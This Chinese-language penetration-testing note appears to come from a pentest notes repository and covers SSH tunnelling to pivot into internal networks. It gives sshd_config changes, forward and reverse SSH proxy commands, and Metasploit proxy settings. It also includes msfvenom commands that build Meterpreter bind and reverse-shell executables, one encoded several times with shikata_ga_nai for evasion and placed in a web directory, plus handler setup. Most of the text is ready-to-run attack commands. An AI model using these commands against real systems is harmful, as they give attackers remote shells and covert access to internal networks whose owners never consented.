  #### 正向代理
	SSH动态转发，是建立正向加密的socks通道
	出网靶机编辑后restart ssh服务
	>vim /etc/ssh/sshd_conf
	AllowTcpForwarding yes 允许TCP转发
	GatewayPorts yes   允许远程主机连接本地转发的端口
	TCPKeepAlive yes    TCP会话保持存活
	PasswordAuthentication yes  密码认证
	外部攻击机执行
	>ssh -C -f -N -g -D 0.0.0.0:12138 root@出网靶机IP -p 22
	MSF中设置全局代理或使用其他软件
	>setg proxies socks5:0.0.0.0:12138
	即可进行攻击隔离区机器
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/326.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/327.png)
  #### 反向代理
	>vim /etc/ssh/sshd_conf
	AllowTcpForwarding yes 允许TCP转发
	GatewayPorts yes   允许远程主机连接本地转发的端口
	TCPKeepAlive yes    TCP会话保持存活
	PasswordAuthentication yes  密码认证
	ClientAliveInterval 修改为30-60保持连接
	ClientAliveCountMax 取消注释 发送请求没响应自动断开次数
	107是外网攻击机
	内网靶机执行：
	>ssh -p 22 -qngfNTR 12138:127.0.0.1:22 root@192.168.0.107
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/328.png)

	攻击机执行
	>ssh -p 12138 -qngfNTD 12345 root@192.168.0.107
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/329.png)
	
	隧道建立，可使用代理软件配置攻击机外网IP:12345访问内网
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/330.png)
  #### SSH隧道+rc4双重加密
	生成木马
	>msfvenom -p windows/x64/meterpreter/bind_tcp_rc4 rc4password=123456 lport=446 -f exe -o /var/www/html/bind.exe
	MSF设置
	>setg proxies socks5:0.0.0.0:12138
	>use exploit/multi/handler
	>set payload windows/x64/meterpreter/bind_tcp_rc4
	>set rc4password 123456
	>set rhost 10.1.1.97
	>set lport 446
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/331.png)
  #### 公网SSH隧道+Local MSF
	>msfvenom -p windows/x64/meterpreter/reverse_tcp -e x64/shikata_ga_nai -i 5 -b ‘\x00’ LHOST=公网IP LPORT=12138 -f exe –o /var/www/html/1.exe
	Handler监听本地IP:12138
	SSH转发
	>ssh -N -R 12138:本地内网IP:12138 root@公网IP
